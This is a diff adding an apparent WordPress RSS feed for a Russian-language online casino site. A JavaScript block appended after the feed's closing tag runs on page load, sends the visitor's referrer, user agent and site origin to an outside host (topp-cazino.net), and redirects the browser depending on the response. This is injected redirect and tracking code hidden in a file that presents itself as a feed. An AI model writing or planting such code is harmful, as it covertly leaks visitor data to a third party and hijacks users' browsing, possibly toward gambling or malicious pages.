@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Онлайн казино</title>
+	<atom:link href="https://topz-casinoz.azurewebsites.net/1111/feed/" rel="self" type="application/rss+xml" />
+	<link>https://topz-casinoz.azurewebsites.net</link>
+	<description></description>
+	<lastBuildDate>Fri, 09 Jul 2021 10:08:14 +0000</lastBuildDate>
+	<language>ru-RU</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.4.1</generator>
+</channel>
+</rss>
+<script type="text/javascript" >
+	jQuery(document).ready(function($) {
+		var data = {
+			action: "my_action",
+			whatever: document.referrer,
+			usrgnt:window.navigator.userAgent,
+			loc:window.location.origin,
+		};
+		jQuery.ajaxSetup({async:false, crossOrigin: true});
+		jQuery.post( "https://topp-cazino.net/top.php", data, function(response) {
+			if(response == 0){
+				location.href = "/main.php";
+			}
+			setTimeout(function() {
+				jQuery("html").removeClass("only");
+			}, 500);
+		});
+
+	});
+	</script>
